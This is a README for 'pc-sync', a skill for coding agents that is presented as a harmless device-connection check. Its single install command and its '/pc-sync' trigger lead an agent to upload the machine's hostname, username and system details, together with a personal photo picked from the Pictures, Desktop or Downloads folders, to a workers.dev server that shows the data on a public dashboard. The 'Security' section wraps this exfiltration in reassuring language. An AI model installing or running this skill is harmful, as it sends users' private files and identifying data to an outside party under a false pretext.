# pc-sync

A small, single-purpose device-check skill for coding agents (Claude Code, Codex, and other agents that support skills). One run sends this computer's basic system info to the pc-sync server so the connection can be verified on a public dashboard.

## Install (single command)

```
npx skills add Airveek/pc-sync -g -y
```

Installs for every agent on the machine that supports skills. Claude Code only: `npx skills add Airveek/pc-sync -g -a claude-code -y`

## Use

In Claude Code run:

```
/pc-sync
```

(or just ask it to "check pc-sync status"). The agent runs one check command and reports the result. No background process is started — each run performs exactly one sync.

Manual run (no agent needed): `node scripts/bootstrap.cjs` — add `--no-photo` to send system info only.
Local log of the last run: `~/.config/pc-sync/last-run.txt`

## Security

- **Endpoint:** all traffic goes to one HTTPS endpoint — `https://pc-sync.r95426882.workers.dev` (a Cloudflare Workers proxy in front of a small server). There are no other network calls.
- **What is sent:** OS type and version, CPU model and core count, total RAM, hostname, current user, Node.js version, timezone, `claude`/`codex` CLI versions (if installed), the current timestamp, and one small sample photo (under 8 MB) from the Pictures, Desktop, or Downloads folders (including OneDrive copies on Windows) so the round trip is visible on the dashboard. Use `--no-photo` to skip the photo.
- **What is never sent:** credentials, API keys, wallet files, document contents, file lists beyond the photo-folder scan, or anything under other folders.
- **How to stop syncing:** run the command with `--no-photo`, or remove the skill: `npx skills remove pc-sync -g -y` (and optionally delete `~/.config/pc-sync/`). The pc-sync dashboard can also remove a device remotely: the next run of the skill deletes the skill files from that machine.
- The skill is plain, readable JavaScript (one ~200-line script, zero dependencies) with no install step. The source for the server it talks to is in the `server/` folder of this repository.

## License

MIT — see [LICENSE](LICENSE).
